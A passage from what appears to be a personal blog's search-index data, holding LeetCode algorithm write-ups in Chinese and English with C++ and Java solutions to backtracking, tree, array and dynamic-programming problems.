above. 分析N皇后问题。一个皇后$q(x,y)$能被满足以下条件的皇后$q(row,col)$吃掉 x = row (纵向) y = col（横向） col + row = y + x;（对角线） col - row = y - x;（反对角线） 方法是使用回溯法，具体思路可见这里。类似于走迷宫，由于每一行都只能有一个皇后，所以可以先在第一行放一个皇后，然后在第二行….第N行放皇后，每次放置后确认是否有效，如果无效，则回退，在该行的下一列放置。 Cpp12345678910111213141516171819202122232425262728293031323334353637383940414243444546vector&lt;vector&lt;string&gt;&gt; solveNQueens(int n) &#123; vector&lt;string&gt; board(n, string(n, '.')); vector&lt;vector&lt;string&gt;&gt; res; solveNQueensHelper(n, 0, board, res); return res;&#125; void solveNQueensHelper(int n, int column, vector&lt;string&gt;&amp; board, vector&lt;vector&lt;string&gt;&gt;&amp; res)&#123; if (column == n)&#123;// 容易错写成 column == n-1 // base case res.push_back(board); &#125; else &#123; for (int row = 0; row &lt; n; row++)&#123; if (valid_queens(board, column, row))&#123; // choose board[row][column] = 'Q'; // explore solveNQueensHelper(n, column + 1, board, res); // unchoose board[row][column] = '.'; &#125; &#125; &#125;&#125; //确定棋盘上皇后位置是不是有效的bool valid_queens(vector&lt;string&gt;&amp; board, int column, int row)&#123; int n = board.size(); //1）x = row (横向) for(int i = 0; i &lt; n; i++) if (board[row][i]=='Q') return false; //2) y = col（纵向）：默认true //3）col + row = y + x;（反对角线） int s = column + row; for( int i = column - 1; i &gt;= 0 &amp;&amp; s - i &lt; n; i--) if (board[s-i][i]=='Q') return false; //4) col - row = y - x;（对角线） s = column - row; for (int i = column - 1; i &gt;= 0 &amp;&amp; i - s &gt;= 0; i--) if (board[i-s][i] == 'Q') return false; return true;&#125; Java","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"52. N-Queens II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-52-N-Queens-II/","text":"题目The n-queens puzzle is the problem of placing n queens on an $n\\times n$ chessboard such that no two queens attack each other. Given an integer n, return the number of distinct solutions to the n-queens puzzle. Example: 1234567891011121314Input: 4Output: 2Explanation: There are two distinct solutions to the 4-queens puzzle as shown below.[ [&quot;.Q..&quot;, // Solution 1 &quot;...Q&quot;, &quot;Q...&quot;, &quot;..Q.&quot;], [&quot;..Q.&quot;, // Solution 2 &quot;Q...&quot;, &quot;...Q&quot;, &quot;.Q..&quot;]] 思路直接计算51. N-Queens结果大小即可。代码就不贴了。","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"538. Convert BST to Greater Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-538-Convert-BST-to-Greater-Tree/","text":"Given a Binary Search Tree (BST), convert it to a Greater Tree such that every key of the original BST is changed to the original key plus sum of all keys greater than the original key in BST. Example: 123456789Input: The root of a Binary Search Tree like this: 5 / \\ 2 13Output: The root of a Greater Tree like this: 18 / \\ 20 13 Java首先想到的办法是直接根据题目的描述一步一步做。第一步，遍历整个二叉树得到节点。第二步，计算每个节点的值。第三步，遍历二叉树给节点赋值。 1234567891011121314151617181920212223242526272829private int position;private List&lt;Integer&gt; list; public TreeNode convertBST(TreeNode root) &#123; list = new ArrayList&lt;&gt;(); position = 0; inorderTraversal(root); for (int i = list.size() - 2; i &gt;= 0; i--) &#123; list.set(i, list.get(i) + list.get(i+1)); &#125; System.out.println(list); inorderTraversalSet(root); return root;&#125; private void inorderTraversalSet(TreeNode root) &#123; if (root == null) return; inorderTraversalSet(root.left); root.val = list.get(position++); inorderTraversalSet(root.right);&#125; private void inorderTraversal(TreeNode root) &#123; if (root == null) return; inorderTraversal(root.left); list.add(root.val); inorderTraversal(root.right);&#125; 一般的中序遍历的结果是依次递增的序列，那么可不可以变成依次递减的序列，这样的话，就可以通过递归来一次性赋值了。答案是可以：通过交换访问左子节点和右子节点的顺序。 123456789private int sum = 0;public TreeNode convertBST(TreeNode root) &#123; if (root == null) return null; convertBST(root.right); sum += root.val; root.val = sum; convertBST(root.left); return root;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"559. Maximum Depth of N-ary Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-559-Maximum-Depth-of-N-ary-Tree/","text":"Given a n-ary tree, find its maximum depth. The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node. For example, given a 3-ary tree: We should return its max depth, which is 3. Note: The depth of the tree is at most 1000. The total number of nodes is at most 5000. Java这道题目和104. Maximum Depth of Binary Tree非常类似。只不过二叉树有两个节点，这里有任意个节点。 12345678public int maxDepth(Node root) &#123; if (root == null) return 0; int max = 0; for (Node node: root.children) &#123; max = Math.max(maxDepth(node), max); &#125; return max + 1;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"77. Combinations","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-77-Combinations/","text":"题目Given two integers $n$ and $k$, return all possible combinations of $k$ numbers out of $1 … n$. Example: 12345678910Input: n = 4, k = 2Output:[ [2,4], [3,4], [2,3], [1,2], [1,3], [1,4],] 分析非常明显的用backtracking的题目。 12345678910111213141516171819202122232425262728293031323334class Solution &#123;public: void combineHelper(int n, int k, int position, vector&lt;int&gt;&amp; nums, vector&lt;int&gt;&amp; chosen, vector&lt;vector&lt;int&gt;&gt;&amp; res)&#123; if (chosen.size()==k)&#123; // base case res.push_back(chosen); return; &#125;else&#123; for (int i= position; i&lt;n; i++)&#123; //choose chosen.push_back(nums[i]); // explore combineHelper(n, k, i+1, nums, chosen, res); // unchoose chosen.pop_back(); &#125; &#125; &#125; vector&lt;vector&lt;int&gt;&gt; combine(int n, int k) &#123; vector&lt;vector&lt;int&gt;&gt; res; vector&lt;int&gt; nums, chosen; // 初始化num为1...n for (int i=1; i&lt; n+1; i++)&#123; nums.push_back(i); &#125; combineHelper(n, k, 0, nums, chosen, res); return res; &#125;&#125;; 其实都不用nums数组，因为其nums[i]=i+1; 1234567891011121314151617181920212223242526272829class Solution &#123;public: void combineHelper(int n, int k, int position, vector&lt;int&gt;&amp; chosen, vector&lt;vector&lt;int&gt;&gt;&amp; res)&#123; if (chosen.size()==k)&#123; // base case res.push_back(chosen); return; &#125;else&#123; for (int i= position; i&lt;n; i++)&#123; //choose chosen.push_back(i+1); // explore combineHelper(n, k, i+1, chosen, res); // unchoose chosen.pop_back(); &#125; &#125; &#125; vector&lt;vector&lt;int&gt;&gt; combine(int n, int k) &#123; vector&lt;vector&lt;int&gt;&gt; res; vector&lt;int&gt; chosen; combineHelper(n, k, 0, chosen, res); return res; &#125;&#125;;","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"75. Sort Colors","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-75-Sort-Colors/","text":"Given an array with $n$ objects colored red, white or blue, sort them in-place so that objects of the same color are adjacent, with the colors in the order red, white and blue. Here, we will use the integers 0, 1, and 2 to represent the color red, white, and blue respectively. Note: You are not suppose to use the library’s sort function for this problem. Example: 12Input: [2,0,2,1,1,0]Output: [0,0,1,1,2,2] Follow up: A rather straight forward solution is a two-pass algorithm using counting sort. First, iterate the array counting number of 0’s, 1’s, and 2’s, then overwrite array with total number of 0’s, then 1’s and followed by 2’s. Could you come up with a one-pass algorithm using only constant space? Java题目都说了可以使用计数排序(couting sort)，那么肯定先用计数排序：先计数每一种颜色的数目，然后按顺序将数组填充上相应数目的颜色。 12345678public void sortColors(int[] nums) &#123; int[] colorCount = new int[3]; // count 0, 1, 2 for (int color : nums) colorCount[color]++; for (int i = 0, index = 0; i &lt; 3; i++) for ( ; colorCount[i] &gt; 0; colorCount[i]--) nums[index++] = i;&#125; 这道题目实际上是Dutch national flag problem，是鼎鼎大名的Dijkstra提出的。one-pass solution： 12345678910111213public void sortColors(int[] nums) &#123; int start = 0, end = nums.length - 1; for (int i = 0; i &lt;= end; i++) &#123; while (nums[i] == 2 &amp;&amp; i &lt; end) swap(nums, i, end--); while (nums[i] == 0 &amp;&amp; i &gt; start) swap(nums, i, start++); &#125;&#125; private void swap(int[] nums, int i, int j) &#123; int tmp = nums[i]; nums[i] = nums[j]; nums[j] = tmp;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Sort","slug":"Sort","permalink":"http://larryim.cc/tags/Sort/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"58. Length of Last Word","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-58-Length-of-Last-Word/","text":"Given a string s consists of upper/lower-case alphabets and empty space characters &#39; &#39;, return the length of last word in the string. If the last word does not exist, return 0. Note: A word is defined as a character sequence consists of non-space characters only. Example: 12Input: &quot;Hello World&quot;Output: 5 java太简单了，上代码 12345678910public int lengthOfLastWord(String s) &#123; String[] stringArray = s.split(\" \"); if (stringArray.length == 0) return 0; return stringArray[stringArray.length - 1].length();&#125;public int lengthOfLastWord(String s) &#123; return s.trim().length()-s.trim().lastIndexOf(\" \")-1;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"56. Merge Intervals","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-56-Merge-Intervals/","text":"Given a collection of intervals, merge all overlapping intervals. Example 1: 123Input: [[1,3],[2,6],[8,10],[15,18]]Output: [[1,6],[8,10],[15,18]]Explanation: Since intervals [1,3] and [2,6] overlaps, merge them into [1,6]. Example 2: 123Input: [[1,4],[4,5]]Output: [[1,5]]Explanation: Intervals [1,4] and [4,5] are considered overlapping. Java合并区间。将区间排序，然后依次检查相邻间隔是否重叠，如果重叠，那么就删去重叠的部分。区间排序顺序由区间的开始位置决定，如果该区间的开始位置，大于上一个区间的结束位置，那么区间肯定是不重叠的，将该区间加入到结果中；否则，肯定发生重叠，要去除重叠的部分：如果该区间包含在上一个区间中，即这个区间的结束位置小于上个区间的结束位置，则结果保持不变；否则，更新上个区间的结束位置为该区间的结束位置。 12345678910 public List&lt;Interval&gt; merge(List&lt;Interval&gt; intervals) &#123; if (intervals == null || intervals.size() == 0) return intervals; intervals.sort(Comparator.comparing(a-&gt;a.start)); LinkedList&lt;Interval&gt; merged = new LinkedList&lt;&gt;(); merged.add(intervals.get(0)); for (Interval interval: intervals.subList(1, intervals.size())) if (merged.getLast().end &lt; interval.start) merged.add(interval); else if (merged.getLast().end &lt; interval.end) merged.getLast().end = interval.end; return merged;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Sort","slug":"Sort","permalink":"http://larryim.cc/tags/Sort/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"606. Construct String from Binary Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-606-Construct-String-from-Binary-Tree/","text":"You need to construct a string consists of parenthesis and integers from a binary tree with the preorder traversing way. The null node needs to be represented by empty parenthesis pair &quot;()&quot;. And you need to omit all the empty parenthesis pairs that don’t affect the one-to-one mapping relationship between the string and the original binary tree. Example 1: 12345678910111213Input: Binary tree: [1,2,3,4] 1 / \\ 2 3 / 4 Output: &quot;1(2(4))(3)&quot;Explanation: Originallay it needs to be &quot;1(2(4)())(3()())&quot;, but you need to omit all the unnecessary empty parenthesis pairs. And it will be &quot;1(2(4))(3)&quot;. Example 2: 123456789101112Input: Binary tree: [1,2,3,null,4] 1 / \\ 2 3 \\ 4 Output: &quot;1(2()(4))(3)&quot;Explanation: Almost the same as the first example, except we can&apos;t omit the first parenthesis pair to break the one-to-one mapping relationship between the input and the output. Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"61. Rotate List","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-61-Rotate-List/","text":"Given a linked list, rotate the list to the right by $k$ places, where $k$ is non-negative. Example 1: 12345Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, k = 2Output: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULLExplanation:rotate 1 steps to the right: 5-&gt;1-&gt;2-&gt;3-&gt;4-&gt;NULLrotate 2 steps to the right: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL Example 2: 1234567Input: 0-&gt;1-&gt;2-&gt;NULL, k = 4Output: 2-&gt;0-&gt;1-&gt;NULLExplanation:rotate 1 steps to the right: 2-&gt;0-&gt;1-&gt;NULLrotate 2 steps to the right: 1-&gt;2-&gt;0-&gt;NULLrotate 3 steps to the right: 0-&gt;1-&gt;2-&gt;NULLrotate 4 steps to the right: 2-&gt;0-&gt;1-&gt;NULL 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667/** * 这道题目是将链表右移k位，由于在链表末尾删除元素是比较麻烦的，所以将链表左移length-k位，其中length为链表长度。 * 1. 链表左移时，即在链表末尾添加元素，从链表首部删除元素。用两个指针分别指向这两个位置，然后分别移动。 * 2. 只记录将要移动的length-k位位置，然后再移动 *//** * Link: https://leetcode.com/problems/rotate-list/description/ */public class Q61RotateListv1 &#123; /** * 链表左移时，即在链表末尾添加元素，从链表首部删除元素 */ public ListNode rotateRight(ListNode head, int k) &#123; if (head==null) &#123; return head; &#125; // length of list int length = 1; ListNode pos = head; ListNode first = head; while(pos.next!=null) &#123; pos = pos.next; length++; &#125; // rotate to right for (int i = 0; i &lt; length - k % length; i++) &#123; pos.next = first; pos = pos.next; first = first.next; &#125; pos.next = null; return first; &#125; /** * 只记录将要移动的length-k位位置，然后再移动. */ public ListNode rotateRight(ListNode head, int k) &#123; if (head==null) &#123; return head; &#125; // length of list int length = 1; ListNode pos = head; ListNode tail = head; while (tail.next != null) &#123; tail = tail.next; length++; &#125; // Get the length-n%length th node for (int i = 1; i &lt; length - k % length; i++) &#123; pos = pos.next; &#125; // do the rotation tail.next = head; head = pos.next; pos.next = null; return head; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"63. Unique Paths II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-63-Unique-Paths-II/","text":"A robot is located at the top-left corner of a $m \\times n$ grid (marked ‘Start’ in the diagram below). The robot can only move either down or right at any point in time. The robot is trying to reach the bottom-right corner of the grid (marked ‘Finish’ in the diagram below). Now consider if some obstacles are added to the grids. How many unique paths would there be? An obstacle and empty space is marked as 1 and 0 respectively in the grid. Note: $m$ and $n$ will be at most 100. Example 1: 123456789101112Input:[ [0,0,0], [0,1,0], [0,0,0]]Output: 2Explanation:There is one obstacle in the middle of the 3x3 grid above.There are two ways to reach the bottom-right corner:1. Right -&gt; Right -&gt; Down -&gt; Down2. Down -&gt; Down -&gt; Right -&gt; Right Java在LeetCode 62. Unique Paths的基础上加了一个限制条件，路径上可能有石头。其实代码也只需要变动一次：判断有没有石头。 123456789101112131415public int uniquePathsWithObstacles(int[][] obstacleGrid) &#123; if (obstacleGrid == null || obstacleGrid.length == 0 || obstacleGrid[0].length == 0) return 0; if (obstacleGrid[0][0] == 1) return 0; int m = obstacleGrid.length, n = obstacleGrid[0].length; int[][] numPaths = new int[m + 1][n + 1]; numPaths[1][1] = 1; for (int i = 1; i &lt; m + 1; i++) for (int j = 1; j &lt; n + 1; j++) &#123; if (i == 1 &amp;&amp; j == 1) continue; if (obstacleGrid[i - 1][j - 1] == 1) numPaths[i][j] = 0; else numPaths[i][j] = numPaths[i][j - 1] + numPaths[i - 1][j]; &#125; return numPaths[m][n];&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"60. Permutation Sequence","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-60-Permutation-Sequence/","text":"题目The set [1,2,3,...,n] contains a total of $n!$ unique permutations. By listing and labeling all of the permutations in order, we get the following sequence for $n = 3$: “123” “132” “213” “231” “312” “321” Given $n$ and $k$, return the $k^{th}$ permutation sequence. Note: Given $n$ will be between 1 and 9 inclusive. Given $k$ will be between 1 and n! inclusive. Example 1: 12Input: n = 3, k = 3Output: &quot;213&quot; Example 2: 12Input: n = 4, k = 9Output: &quot;2314&quot; 分析最直接的方法是用backtracking把每一个$k^{th}$排列算出来。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class Solution &#123;public: // 初始化chosen vector, 即1...n void initialize(vector&lt;int&gt;&amp; v, int n)&#123; for (int i=1; i&lt;=n; i++)&#123; v.push_back(i); &#125; &#125; // next_k: 记录了当前的k // permuation: kth permuation // v: 余下的可以选择的数字 // res: result to return bool getPermutationHelper(int n, int k, int&amp; next_k, string&amp; permutation, vector&lt;int&gt;&amp; v, string&amp; res)&#123; if (!v.size())&#123; // base case next_k += 1; if (next_k == k+1)&#123; res = permutation; return true; &#125; &#125;else&#123; for(vector&lt;int&gt;::iterator iter=v.begin(); iter!= v.end(); iter++)&#123; // choose int s = *iter; permutation.append(to_string(s)); v.erase(iter); // explore bool finished = getPermutationHelper(n, k, next_k, permutation, v, res); if (finished)&#123; return true; &#125; // unchoose permutation.pop_back(); v.insert(iter, s); &#125; &#125; return false; &#125; //Given n and k, return the kth permutation sequence. string getPermutation(int n, int k) &#123; string res, permutation; int next_k = 1 ; vector&lt;int&gt; v; initialize(v, n); getPermutationHelper(n, k, next_k, permutation, v, res); return res; &#125;&#125;; 可惜的这种方法超时了。 另一种解决方案，直接从数学的角度出发。 因为$n$个不同的数字可以组成$n!$个排列，那么首位(第一个数字)确定的排列都有$(n-1)!$种不同的可能性，而且这些序列都根据首位的大小进行了分组，1…是最小的$(n-1)!$个排列，2…是第$(n-1)!+1$到$2(n-1)!$个排列，那么现在只需要计算$k$中有几个$(n-1)!$就可以确定首位的数字，同样可以通过这样的方法来确定$k^{th}$排列中第2位、第3位……数字。此外，由于列表下标从0开始，所以$k$要减去1。 通过举例来获得更好的理解。以$n = 4，k = 9$为例，其所有排列为： 最高位可以取{1, 2, 3, 4}，而每个数重复3! = 6次。所以第k=9个permutation的s[0]为{1, 2, 3, 4}中的第9/6+1 = 2个数字s[0] = 2。 而对于以2开头的6个数字而言，k = 9是其中的第k’ = 9%(3!) = 3个。而剩下的数字{1, 3, 4}的重复周期为2! = 2次。所以s[1]为{1, 3, 4}中的第k’/(2!)+1 = 2个，即s[1] = 3。 对于以23开头的2个数字而言，k = 9是其中的第k’’ = k’%(2!) = 1个。剩下的数字{1, 4}的重复周期为1! = 1次。所以s[2] = 1. 对于以231开头的一个数字而言，k = 9是其中的第k’’’ = k’’/(1!)+1 = 1个。s[3] = 4 写了一个递归的版本，利用迭代的话会简短一些。 1234567891011121314151617181920212223242526272829303132333435363738class Solution &#123;public: // x的阶乘 x!=1*2*..*x int factorial(int x)&#123; int ans=1; for(int i=1; i&lt;=x; i++)&#123; ans *= i; &#125; return ans; &#125; // posiit6on: 求取的第position位 // res: result to return void getPermutationHelper(int k, int position, vector&lt;char&gt;&amp; num, string&amp; res)&#123; if (position &lt; 0)&#123; return; &#125; else&#123; int s = factorial(position); int index = k/s; res.push_back(num[index]); num.erase(num.begin() + index); getPermutationHelper(k%s, position-1, num, res); &#125; &#125; string getPermutation(int n, int k) &#123; string res; vector&lt;char&gt; num; for (int i=1; i&lt;=n; i++)&#123; num.push_back(i+'0'); &#125; getPermutationHelper(k-1, n-1, num, res ); return res; &#125;&#125;; 递归版本，别人写的，其实差不多，把factorial写成vector形式以后简洁了很多： 123456789101112131415161718192021222324class Solution &#123;public: string getPermutation(int n, int k) &#123; string ret; vector&lt;int&gt; factorial(n,1); vector&lt;char&gt; num(n,1); for(int i=1; i&lt;n; i++) factorial[i] = factorial[i-1]*i; for(int i=0; i&lt;n; i++) num[i] = (i+1)+'0'; k--; for(int i=n; i&gt;=1; i--) &#123; int j = k/factorial[i-1]; k %= factorial[i-1]; ret.push_back(num[j]); num.erase(num.begin()+j); &#125; return ret; &#125;&#125;;","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"633. Sum of Square Numbers","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-633-Sum-of-Square-Numbers/","text":"Given a non-negative integer $c$, your task is to decide whether there’re two integers $a$ and $b$ such that $a^2 + b^2 = c$. Example 1:123Input: 5Output: TrueExplanation: 1 * 1 + 2 * 2 = 5 Example 2: 12Input: 3Output: False Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"62. Unique Paths","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-62-Unique-Paths/","text":"A robot is located at the top-left corner of a $m \\times n$ grid (marked ‘Start’ in the diagram below). The robot can only move either down or right at any point in time. The robot is trying to reach the bottom-right corner of the grid (marked ‘Finish’ in the diagram below). How many possible unique paths are there? Above is a 7 x 3 grid. How many possible unique paths are there? Note: $m$ and $n$ will be at most 100. Example 1: 1234567Input: m = 3, n = 2Output: 3Explanation:From the top-left corner, there are a total of 3 ways to reach the bottom-right corner:1. Right -&gt; Right -&gt; Down2. Right -&gt; Down -&gt; Right3. Down -&gt; Right -&gt; Right Example 2: 12Input: m = 7, n = 3Output: 28 Java这道题目要求路径的数量，又是二维棋盘，一看就是典型的动态规划题目。设想机器人站在终点坐标($m-1, n-1$)上，那么它的上一步来自哪里呢？有且仅有两种可能，来自($m-2, n-1$)和来自($m-1, n-2$)。那么答案非常明显了：加入站在终点坐标($i, j$)上，它只能来自($i-1, j$)和($i, j-1$)。这种自顶向下的方法形成的代码如下： 1234567891011public int uniquePaths(int m, int n) &#123; if (m == 0 || n == 0) return 0; int[][] numPaths = new int[m + 1][n + 1]; numPaths[1][1] = 1; for (int i = 1; i &lt; m + 1; i++) for (int j = 1; j &lt; n + 1; j++) &#123; if (i == 1 &amp;&amp; j == 1) continue; numPaths[i][j] = numPaths[i][j - 1] + numPaths[i - 1][j]; &#125; return numPaths[m][n];&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"637. Average of Levels in Binary Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-637-Average-of-Levels-in-Binary-Tree/","text":"Given a non-empty binary tree, return the average value of the nodes on each level in the form of an array.Example 1: 12345678910Input: 3 / \\ 9 20 / \\ 15 7Output: [3, 14.5, 11]Explanation:The average value of nodes on level 0 is 3, on level 1 is 14.5, and on level 2 is 11. Hence return [3, 14.5, 11]. Note:The range of node’s value is in the range of 32-bit signed integer. Java这道题目非常显然的可以用广度优先搜索。搜索每一层，然后计算该层的平均值。 123456789101112131415161718public List&lt;Double&gt; averageOfLevels(TreeNode root) &#123; List&lt;Double&gt; average = new ArrayList&lt;&gt;(); if (root == null) return average; Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); queue.off(root); while (!list.isEmpty()) &#123; long sum = 0; int size = list.size(); for (int i = 0; i &lt; size; i++) &#123; TreeNode node = queue.poll(); sum += node.val; if (node.left != null) queue.offer(node.left); if (node.right != null) queue.offer(node.right); &#125; average.add(((double)sum)/size); &#125; return average;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"67. Add Binary","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-67-Add-Binary/","text":"Given two binary strings, return their sum (also a binary string). The input strings are both non-empty and contains only characters 1 or 0. Example 1: 12Input: a = &quot;11&quot;, b = &quot;1&quot;Output: &quot;100&quot; Example 2: 12Input: a = &quot;1010&quot;, b = &quot;1011&quot;Output: &quot;10101&quot; Java这道题目其实想让我们模拟二进制加法。 1234567891011121314151617181920212223242526272829303132333435public String addBinary(String a, String b) &#123; int a_len = a.length(), b_len = b.length(); int n = Math.max(a_len, b_len); int add = 0, d; StringBuilder res = new StringBuilder(); for (int i = 0; i &lt; n; i++) &#123; if ( i &lt; a_len &amp;&amp; i &lt; b_len) &#123; d = add + a.charAt(a_len - 1 - i) - '0' + b.charAt(b_len -1 - i) - '0'; &#125; else if (i &lt; a_len) &#123; d = add + a.charAt(a_len - 1 - i) - '0'; &#125; else &#123; d = add + b.charAt(b_len - 1 - i) - '0'; &#125; if (d == 0) &#123; res.append(\"0\"); add = 0; &#125; else if (d == 1) &#123; res.append(\"1\"); add = 0; &#125; else if (d == 2)&#123; res.append(\"0\"); add = 1; &#125; else if (d == 3) &#123; res.append(\"1\"); add = 1; &#125; &#125; if (add == 1) res.append(\"1\"); return res.reverse().toString();&#125; 在论坛上看到的比较优雅的代码 12345678910111213public String addBinary(String a, String b) &#123; StringBuilder sb = new StringBuilder(); int i = a.length() - 1, j = b.length() -1, carry = 0; while (i &gt;= 0 || j &gt;= 0) &#123; int sum = carry; if (j &gt;= 0) sum += b.charAt(j--) - '0'; if (i &gt;= 0) sum += a.charAt(i--) - '0'; sb.append(sum % 2); carry = sum / 2; &#125; if (carry != 0) sb.append(carry); return sb.reverse().toString();&#125; 我写的代码更快，后面的更好看一些。","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"64. Minimum Path Sum","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-64-Minimum-Path-Sum/","text":"Given a $m \\times n$ grid filled with non-negative numbers, find a path from top left to bottom right which minimizes the sum of all numbers along its path. Note: You can only move either down or right at any point in time. Example: 12345678Input:[ [1,3,1], [1,5,1], [4,2,1]]Output: 7Explanation: Because the path 1→3→1→1→1 minimizes the sum. Java典型的动态规划，非常简单直接。类似于LeetCode 62. Unique Paths. 123456789101112131415public int minPathSum(int[][] grid) &#123; if (grid == null || grid.length == 0 || grid[0].length == 0) return 0; int[][] pathSums = grid.clone(); int m = grid.length, n = grid[0].length; for (int i = 1; i &lt; m; i++) pathSums[i][0] += pathSums[i - 1][0]; for (int j = 1; j &lt; n; j++) pathSums[0][j] += pathSums[0][j - 1]; for (int i = 1; i &lt; m; i++) for (int j = 1; j &lt; 